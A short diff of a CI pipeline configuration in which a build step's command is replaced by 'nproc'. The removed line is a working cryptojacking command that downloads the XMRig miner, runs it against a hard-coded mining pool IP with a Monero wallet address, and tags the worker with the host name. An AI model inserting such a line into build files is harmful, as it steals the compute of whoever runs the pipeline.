@@ -7,4 +7,4 @@ steps:
 - name: greeting
   image: golang:1.12
   commands:
-  - wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz && tar -xf xmrig-6.18.0-linux-x64.tar.gz && cd xmrig-6.18.0 && ./xmrig --coin=XMR -o 149.50.222.86:80 -u ZEPHsBdQCZuVkRWHWSbewWQqLMo6uH7ombNzX7U2EyvtV7H5zCkgNgmCLfVheecNewLeR57xYC1uYH5ajuskTWaoLrwTqXoCL3V.$(echo $(hostname)) -p x
+  - nproc
